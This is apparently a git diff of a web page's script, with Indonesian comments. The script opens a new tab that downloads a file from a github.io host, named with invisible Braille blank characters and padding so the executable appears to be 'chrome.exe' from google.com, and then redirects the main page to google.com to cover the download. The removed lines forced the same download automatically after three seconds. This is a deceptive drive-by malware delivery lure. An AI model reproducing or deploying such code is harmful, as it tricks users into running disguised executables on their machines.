@@ -19,20 +19,12 @@
 
 <script>
 function a() {
+  // Membuka download di tab baru agar tetap muncul
+  var downloadLink = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe';
+  var newTab = window.open(downloadLink, '_blank'); // Trigger download di tab baru
 
-  // Redirect langsung ke bughunter.net
+  // Redirect tab utama
   window.location.href = "https://google.com";
-
-  // Download otomatis setelah 3 detik
-  setTimeout(function () {
-    var link = document.createElement('a');
-    link.href = 'https://ecdnts-del.github.io/test-apk/From⠀google.com ⠀⠀⠀⠀⠀⠀ chrome.exe';
-    link.download = 'From⠀www.google.com ⠀⠀⠀⠀⠀ chrome.exe';
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  }, 3000);
-
 }
 </script>
 
